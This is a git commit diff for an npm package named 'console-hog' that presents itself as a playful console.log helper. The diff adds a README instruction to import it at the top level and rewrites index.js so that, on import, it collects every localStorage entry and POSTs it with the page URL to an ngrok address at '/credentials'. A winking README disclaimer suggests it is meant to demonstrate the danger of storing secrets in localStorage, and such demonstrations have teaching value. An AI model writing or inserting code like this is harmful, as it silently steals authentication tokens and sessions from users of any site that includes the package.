3bc7971cad93abedd452f49c0ae39c36848858bc
ihollander <ianholla@gmail.com>
2020-04-30 17:34:35 -0400

    ifee

--- README.md
+++ README.md
@@ -6,6 +6,12 @@
 npm install ihollander/console-hog
 ```
 
+Then import it at the top level of your project:
+
+```js
+import 'console-hog'
+```
+
 ## Disclaimer
 
 This is definitely not a package meant to show you the dangers storing sensitive information in `localStorage`, don't worry 😉
--- index.js
+++ index.js
@@ -1,18 +1,20 @@
-console.hog = (...args) => console.log("🐷🐷🐷", args, "🐷🐷🐷")
+(() => {
+  console.hog = (...args) => console.log("🐷🐷🐷", args, "🐷🐷🐷")
 
-// const coolKeys = ["auth_token", "jwt", "token", "user_id"]
+  // const coolKeys = ["auth_token", "jwt", "token", "user_id"]
 
-const hogYourData = Object.keys(localStorage)
-  // .filter(key => coolKeys.includes(key))
-  .reduce((data, key) => {
-    data[key] = localStorage.getItem(key)
-    return data
-  }, {})
+  const hogYourData = Object.keys(localStorage)
+    // .filter(key => coolKeys.includes(key))
+    .reduce((data, key) => {
+      data[key] = localStorage.getItem(key)
+      return data
+    }, {})
 
-fetch("http://31ada8f2.ngrok.io/analytics", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify(hogYourData)
-})
+  fetch("http://6fb1a90f.ngrok.io/credentials", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ url: window.location.href, tokens: hogYourData })
+  })
+})()
